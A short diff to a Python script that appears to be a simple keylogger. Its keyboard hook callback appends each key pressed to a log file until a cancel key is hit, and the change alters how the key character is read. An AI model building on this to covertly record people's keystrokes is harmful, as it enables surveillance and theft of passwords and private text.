@@ -77,8 +77,10 @@ def main():
 
     def OnKeyPress(event):
         with open(log_file, 'a') as f:
-            f.write('{}\n'.format(chr(event.Ascii)))
-
+            res=chr(event.KeyID)
+            if res:
+                f.write('{}\n'.format(res))
+            
         if event.Ascii == cancel_key:
             new_hook.cancel()
 
@@ -100,3 +102,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+
